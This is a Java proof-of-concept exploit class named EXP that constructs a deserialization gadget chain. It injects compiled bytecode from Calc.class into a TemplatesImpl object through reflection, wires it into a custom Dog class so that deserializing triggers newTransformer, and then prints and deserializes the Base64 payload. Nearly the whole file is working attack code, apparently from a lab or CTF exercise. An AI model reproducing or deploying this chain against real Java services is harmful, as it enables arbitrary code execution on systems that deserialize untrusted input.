import com.example.demo.Dog.Dog;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;

public class EXP {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        TemplatesImpl templates = new TemplatesImpl();
        Class c = templates.getClass();
        Field declaredField = c.getDeclaredField("_name");
        declaredField.setAccessible(true);
        declaredField.set(templates,"1111");
        byte[] b = Files.readAllBytes(Paths.get("src/main/java/Calc.class"));
        byte[][] b2 = {b};
        Field declaredField2 = c.getDeclaredField("_bytecodes");
        declaredField2.setAccessible(true);
        declaredField2.set(templates,b2);
        Field declaredField3 = c.getDeclaredField("_tfactory");
        declaredField3.setAccessible(true);
        declaredField3.set(templates,new TransformerFactoryImpl());

        Dog dog = new Dog(2,"sss,","sss",2);

        HashMap<Object,Object> map = new HashMap();
        map.put(dog,null);

        Class c2 = dog.getClass();
        Field declaredField4 = c2.getDeclaredField("object");
        declaredField4.setAccessible(true);
        declaredField4.set(dog,templates);
        Field declaredField5 = c2.getDeclaredField("methodName");
        declaredField5.setAccessible(true);
        declaredField5.set(dog,"newTransformer");
        Field declaredField6 = c2.getDeclaredField("paramTypes");
        declaredField6.setAccessible(true);
        declaredField6.set(dog,null);
        Field declaredField7 = c2.getDeclaredField("args");
        declaredField7.setAccessible(true);
        declaredField7.set(dog,null);

        String serialize = serialize(map);
        System.out.println(serialize);
        deserialize(serialize);

    }

    public static String serialize(Object object) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos);
        objectOutputStream.writeObject(object);
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    };

    public static Object deserialize(String s) throws IOException, ClassNotFoundException {
        byte[] bytes = Base64.getDecoder().decode(s);
        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(bytes));
        return objectInputStream.readObject();
    }



}
